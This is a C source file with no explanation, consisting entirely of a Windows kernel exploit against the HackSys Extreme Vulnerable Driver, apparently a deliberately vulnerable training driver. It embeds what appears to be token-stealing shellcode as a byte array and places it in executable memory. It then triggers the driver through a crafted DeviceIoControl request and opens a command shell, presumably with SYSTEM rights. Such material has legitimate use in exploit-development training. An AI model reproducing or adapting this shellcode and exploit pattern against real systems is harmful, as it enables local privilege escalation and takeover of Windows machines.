#include <windows.h>
#include <stdio.h>

BYTE token[104] = {
    0x6a, 0x18, 0x5a, 0x6a, 0x5c, 0x59, 0x65, 0x4c, 0x8b, 0x1c, 0x8a, 0x49, 0x8b,
    0x04, 0x4b, 0x50, 0x5b, 0x66, 0x81, 0xc2, 0x30, 0x04, 0x48, 0x8b, 0x1c, 0x13,
    0x48, 0x29, 0xd3, 0x8b, 0x4c, 0x13, 0xf8, 0x83, 0xf9, 0x04, 0x75, 0xf0, 0x48,
    0x8b, 0x4c, 0x13, 0x70, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x4c, 0x10, 0x70, 0x49,
    0x93, 0x66, 0x81, 0xea, 0x64, 0x02, 0x66, 0x8b, 0x0c, 0x10, 0x66, 0xff, 0xc1,
    0x66, 0x89, 0x0c, 0x10, 0x6a, 0x48, 0x59, 0x48, 0x8b, 0x14, 0x48, 0x48, 0x8b,
    0x6c, 0x8a, 0x38, 0x4c, 0x8b, 0x5c, 0x8a, 0x58, 0x48, 0x8b, 0x64, 0x8a, 0x60,
    0x48, 0x8b, 0x4c, 0x8a, 0x48, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07
};

typedef struct {
    ULONG_PTR objectID;
    ULONG_PTR objectType;
} UserObject;

int main() {
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(token), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, token, sizeof(token));

    UserObject payload = {
        0x4141414141414141,
        (ULONG_PTR) shellcode
    };

    HANDLE handle = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (handle == INVALID_HANDLE_VALUE) {
        puts("[-] Failed to get handle");
        exit(1);
    }

    DeviceIoControl(handle, 0x222023, &payload, sizeof(payload), NULL, 0, NULL, NULL);

    system("cmd.exe");
    exit(0);

    return 0;
}
